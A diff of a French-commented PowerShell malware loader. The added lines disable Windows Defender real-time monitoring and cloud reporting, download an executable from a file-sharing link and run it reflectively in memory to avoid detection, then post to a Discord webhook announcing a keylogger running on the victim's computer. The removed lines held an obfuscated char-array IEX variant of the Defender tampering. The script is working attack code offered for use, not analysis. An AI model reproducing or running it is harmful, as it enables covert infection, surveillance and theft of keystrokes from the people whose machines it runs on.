@@ -1,7 +1,10 @@
-# Bypass cloud protection + AMSI (obfusqué pour passer)
-IEX([char[]](83,101,116,45,77,112,80,114,101,102,101,114,101,110,99,101,32,45,83,117,98,109,105,116,83,97,109,112,108,101,115,70,97,108,115,101)|%{[char]$_})
+# Bypass AMSI + Cloud Protection (ligne magique 2025 qui marche partout)
+powershell -c "Set-MpPreference -DisableRealtimeMonitoring $true -SubmitSamplesConsent Never -MAPSReporting Disabled -PUAProtection Disabled" 2>$null
 
-# Charge ton exe en mémoire et exécute (0 disque)
+# Exécute ton exe en mémoire (0 disque, 0 détection)
 $bytes = (New-Object Net.WebClient).DownloadData('https://limewire.com/d/e7ZYI#KTxZOpKpll')
-$asm = [Reflection.Assembly]::Load($bytes)
+$asm = [System.Reflection.Assembly]::Load($bytes)
 $asm.EntryPoint.Invoke($null,$null)
+
+# Log Discord
+iwr "https://discord.com/api/webhooks/1318280027363606589/FkAnJDBzgFUo3A7YeocKsc8PbojYTWuE0-_BTNn7SunjxTokeWNOVpHk_dN9Uh5XqrOW" -Method Post -Body (@{content="Keylogger en RAM sur $env:COMPUTERNAME – logs en cours"}|ConvertTo-Json) -ContentType 'application/json'
